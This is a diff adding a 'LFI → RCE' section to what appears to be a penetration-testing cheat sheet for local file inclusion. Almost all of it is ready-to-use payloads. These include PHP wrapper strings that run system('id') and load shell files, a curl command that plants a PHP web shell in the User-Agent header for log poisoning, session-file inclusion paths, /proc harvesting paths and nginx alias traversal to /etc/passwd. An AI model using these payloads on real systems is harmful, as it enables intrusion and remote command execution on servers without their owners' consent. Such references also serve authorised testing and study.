@@ -170,6 +170,52 @@ C:\boot.ini
 /proc/self/environ
 ```
 
+## LFI → RCE
+
+### PHP Wrappers
+
+```
+php://filter/convert.base64-encode/resource=config.php
+php://input (POST: <?php system('id'); ?>)
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
+expect://id
+zip://uploads/evil.zip#shell.php
+phar://uploads/avatar.jpg/stub
+```
+
+### Log Poisoning
+
+```bash
+# Inject in User-Agent, then include log
+curl -A "<?php system(\$_GET['c']); ?>" http://target/
+?page=../../../var/log/apache2/access.log&c=id
+?page=../../../var/log/nginx/access.log&c=id
+?page=../../../var/log/mail.log&c=id
+```
+
+### Session Poisoning
+
+```
+?page=../../../tmp/sess_<SESSIONID>
+?page=../../../var/lib/php/sessions/sess_<SESSIONID>
+```
+
+### /proc Harvesting
+
+```
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/fd/X
+/proc/self/maps
+```
+
+### Nginx Alias Mismatch
+
+```
+/static../etc/passwd
+/static..;/etc/passwd
+```
+
 ## Tools
 
 ```bash
